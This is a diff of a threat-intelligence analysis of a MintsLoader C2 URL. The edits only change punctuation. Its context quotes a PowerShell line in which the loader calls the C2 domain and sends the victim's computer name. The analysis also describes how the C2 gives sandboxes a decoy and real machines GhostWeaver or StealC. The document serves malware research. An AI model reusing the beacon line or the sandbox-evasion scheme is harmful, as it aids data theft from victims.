@@ -17,7 +17,7 @@ created: 2025-04-22
 
 ## Objective
 
-Dissect every component of the C2 URL IOC and match each element against documented MintsLoader technical signatures — confirming the malware family and extracting victim-side intelligence.
+Dissect every component of the C2 URL IOC and match each element against documented MintsLoader technical signatures, confirming the malware family and extracting victim-side intelligence.
 
 ---
 
@@ -86,8 +86,8 @@ $global:block = (curl -useb "http://$domain/$basename.php?id=$env:computername&k
 |---|---|
 | Prefix `DESKTOP-` | Windows default naming for non-domain-joined workstations |
 | Suffix `-ET51AJO` | Randomly generated Windows hostname segment |
-| No domain prefix | Machine is likely a home user or small business — not a corporate domain-joined device |
-| Present in VirusTotal | The same machine submitted the hash — this may be a researcher's sandbox or an actual victim's machine that was later scanned |
+| No domain prefix | Machine is likely a home user or small business, not a corporate domain-joined device |
+| Present in VirusTotal | The same machine submitted the hash. This may be a researcher's sandbox or an actual victim's machine that was later scanned |
 
 ---
 
@@ -112,7 +112,7 @@ If key matches real hardware → C2 delivers GhostWeaver / StealC
 If key indicates sandbox/VM → C2 delivers decoy payload
 ```
 
-This mechanism could make automated sandbox analysis ineffective — sandboxes receive a harmless decoy and never see the real payload.
+This mechanism could make automated sandbox analysis ineffective; sandboxes receive a harmless decoy and never see the real payload.
 
 ---
 
@@ -161,7 +161,7 @@ s=mints13
       → Our value: mints13 = Campaign batch #13
 ```
 
-Orange Cyberdefense — the team that named MintsLoader — specifically stated that the malware gets its name from this distinctive URL parameter. The campaign number allows the operator to track and segment infection batches. Known observed values include `mints11`, `mints12`, `mints13`, and `nints13` (a variant spelling observed in other samples).
+Orange Cyberdefense, the team that named MintsLoader, specifically stated that the malware gets its name from this distinctive URL parameter. The campaign number allows the operator to track and segment infection batches. Known observed values include `mints11`, `mints12`, `mints13`, and `nints13` (a variant spelling observed in other samples).
 
 ---
 
